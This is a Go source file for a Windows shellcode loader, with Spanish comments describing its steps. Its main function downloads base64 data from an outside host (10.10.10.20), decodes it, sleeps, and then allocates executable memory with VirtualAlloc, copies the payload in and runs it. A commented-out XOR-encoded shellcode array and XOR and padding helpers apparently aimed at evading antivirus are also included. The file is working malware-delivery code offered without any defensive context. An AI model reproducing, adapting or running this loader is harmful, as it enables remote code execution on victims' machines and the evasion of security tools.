package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func Padding(buff []byte, size int) []byte {
	str1 := "0x48,0x31,0xC0"
	res1 := strings.Repeat(str1, size*1024*1024)
	sum := string(buff) + res1
	mydata := []byte(sum)
	return mydata

}

func GetCode(code string) string {
	link, err := http.Get(code)
	userAGent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0`
	link.Header.Set("User-Agent", userAGent)
	if err != nil {
		log.Fatal(err)
	}

	reqBody, err := ioutil.ReadAll(link.Body)
	fmt.Println(err)
	return string(reqBody)
}

func Inyec(data []byte) {

	//shellcode := []byte{191, 11, 192, 167, 179, 171, 139, 67, 67, 67, 2, 18, 2, 19, 17, 18, 21, 11, 114, 145, 38, 11, 200, 17, 35, 11, 200, 17, 91, 11, 200, 17, 99, 11, 200, 49, 19, 11, 76, 244, 9, 9, 14, 114, 138, 11, 114, 131, 239, 127, 34, 63, 65, 111, 99, 2, 130, 138, 78, 2, 66, 130, 161, 174, 17, 2, 18, 11, 200, 17, 99, 200, 1, 127, 11, 66, 147, 37, 194, 59, 91, 72, 65, 54, 49, 200, 195, 203, 67, 67, 67, 11, 198, 131, 55, 36, 11, 66, 147, 19, 200, 11, 91, 7, 200, 3, 99, 10, 66, 147, 160, 21, 11, 188, 138, 2, 200, 119, 203, 11, 66, 149, 14, 114, 138, 11, 114, 131, 239, 2, 130, 138, 78, 2, 66, 130, 123, 163, 54, 178, 15, 64, 15, 103, 75, 6, 122, 146, 54, 155, 27, 7, 200, 3, 103, 10, 66, 147, 37, 2, 200, 79, 11, 7, 200, 3, 95, 10, 66, 147, 2, 200, 71, 203, 11, 66, 147, 2, 27, 2, 27, 29, 26, 25, 2, 27, 2, 26, 2, 25, 11, 192, 175, 99, 2, 17, 188, 163, 27, 2, 26, 25, 11, 200, 81, 170, 12, 188, 188, 188, 30, 41, 67, 10, 253, 52, 42, 45, 42, 45, 38, 55, 67, 2, 21, 10, 202, 165, 15, 202, 178, 2, 249, 15, 52, 101, 68, 188, 150, 11, 114, 138, 11, 114, 145, 14, 114, 131, 14, 114, 138, 2, 19, 2, 19, 2, 249, 121, 21, 58, 228, 188, 150, 168, 48, 25, 11, 202, 130, 2, 251, 193, 96, 67, 67, 14, 114, 138, 2, 18, 2, 18, 41, 64, 2, 18, 2, 249, 20, 202, 220, 133, 188, 150, 168, 26, 24, 11, 202, 130, 11, 114, 145, 10, 202, 155, 14, 114, 138, 17, 43, 67, 65, 3, 199, 17, 17, 2, 249, 168, 22, 109, 120, 188, 150, 11, 202, 133, 11, 192, 128, 19, 41, 73, 28, 11, 202, 178, 11, 202, 153, 10, 132, 131, 188, 188, 188, 188, 14, 114, 138, 17, 17, 2, 249, 110, 69, 91, 56, 188, 150, 198, 131, 76, 198, 222, 66, 67, 67, 11, 188, 140, 76, 199, 207, 66, 67, 67, 168, 144, 170, 167, 66, 67, 67, 171, 225, 188, 188, 188, 108, 4, 25, 51, 15, 67, 142, 191, 127, 148, 146, 186, 31, 118, 166, 221, 194, 117, 21, 139, 51, 108, 208, 159, 31, 142, 148, 174, 108, 211, 59, 94, 119, 169, 129, 198, 131, 178, 240, 247, 73, 195, 30, 23, 153, 39, 25, 206, 175, 226, 127, 132, 64, 43, 77, 54, 249, 206, 80, 114, 231, 194, 232, 117, 120, 217, 109, 95, 66, 199, 75, 234, 90, 187, 128, 235, 141, 32, 54, 67, 22, 48, 38, 49, 110, 2, 36, 38, 45, 55, 121, 99, 14, 44, 57, 42, 47, 47, 34, 108, 118, 109, 115, 99, 107, 32, 44, 46, 51, 34, 55, 42, 33, 47, 38, 120, 99, 14, 16, 10, 6, 99, 122, 109, 115, 120, 99, 20, 42, 45, 39, 44, 52, 48, 99, 13, 23, 99, 117, 109, 114, 120, 99, 20, 12, 20, 117, 119, 120, 99, 23, 49, 42, 39, 38, 45, 55, 108, 118, 109, 115, 120, 99, 14, 7, 7, 17, 9, 16, 106, 78, 73, 67, 21, 101, 1, 22, 84, 28, 160, 35, 23, 85, 146, 101, 29, 45, 184, 72, 122, 148, 101, 71, 72, 153, 217, 209, 240, 153, 36, 40, 158, 11, 34, 6, 134, 176, 107, 83, 136, 220, 107, 102, 42, 37, 119, 153, 223, 148, 24, 96, 201, 163, 233, 72, 20, 18, 67, 151, 227, 189, 114, 87, 101, 45, 131, 54, 148, 204, 6, 206, 118, 228, 123, 220, 239, 149, 222, 229, 103, 181, 7, 242, 139, 143, 125, 28, 135, 64, 4, 112, 21, 230, 184, 58, 149, 245, 157, 56, 150, 201, 216, 132, 217, 155, 32, 254, 130, 179, 33, 24, 18, 251, 25, 4, 230, 182, 208, 5, 174, 245, 37, 155, 21, 145, 231, 52, 15, 244, 2, 50, 21, 29, 127, 202, 154, 95, 32, 56, 133, 173, 83, 105, 227, 6, 212, 102, 104, 94, 87, 217, 100, 217, 193, 47, 37, 114, 106, 106, 43, 0, 30, 255, 229, 237, 65, 23, 107, 15, 84, 15, 232, 8, 0, 248, 104, 129, 65, 112, 112, 186, 227, 167, 220, 138, 250, 208, 150, 255, 246, 121, 145, 71, 65, 86, 96, 245, 116, 109, 41, 36, 101, 2, 128, 102, 252, 9, 194, 54, 217, 255, 172, 224, 67, 2, 253, 179, 246, 225, 21, 188, 150, 11, 114, 138, 249, 67, 67, 3, 67, 2, 251, 67, 83, 67, 67, 2, 250, 3, 67, 67, 67, 2, 249, 27, 231, 16, 166, 188, 150, 11, 208, 16, 16, 11, 202, 164, 11, 202, 178, 11, 202, 153, 2, 251, 67, 99, 67, 67, 10, 202, 186, 2, 249, 81, 213, 202, 161, 188, 150, 11, 192, 135, 99, 198, 131, 55, 245, 37, 200, 68, 11, 66, 128, 198, 131, 54, 148, 27, 27, 27, 11, 70, 67, 67, 67, 67, 19, 128, 171, 220, 190, 188, 188, 114, 122, 113, 109, 114, 117, 123, 109, 114, 119, 117, 109, 114, 113, 123, 67, 90, 42, 227, 206}
	//	cipher := Xor(shellcode, 67)
	//	fmt.Println(cipher)
	//junker := Padding(data, 80)
	//color.Yellow(fmt.Sprintf("%x\n", junker))
	//Después de la prueba, se encuentra que el cargador escrito en Golang puede solicitar directamente la memoria rwx o solicitar la memoria rw y luego usar VirtualProtect para agregar x, y el efecto no es obvio. Así que solicite directamente la memoria rwx aquí:
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	//color.Yellow(fmt.Sprintf("BaseAddr %d", addr))
	fmt.Printf("Address of : %p\n", &addr)
	fmt.Println(addr)
	//dec := Xor(junker, 67)
	// El cuarto paso, copie el shellcode en el bloque de memoria solicitado:
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	// El quinto paso, la llamada al sistema, ejecuta esta memoria:
	syscall.Syscall(addr, 0, 0, 0, 0)
}
func Xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]

	}
	return res
}

func Base64Decode(str string) (string, string) {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {

		return "", ""
	}
	return string(data), ""
}

func main() {
	ccc := GetCode("http://10.10.10.20/code.txt")
	//xoref := Xor(shellcode, 67)
	ggg, _ := Base64Decode(ccc)
	time.Sleep(10 * time.Second)
	Inyec([]byte(ggg))
}
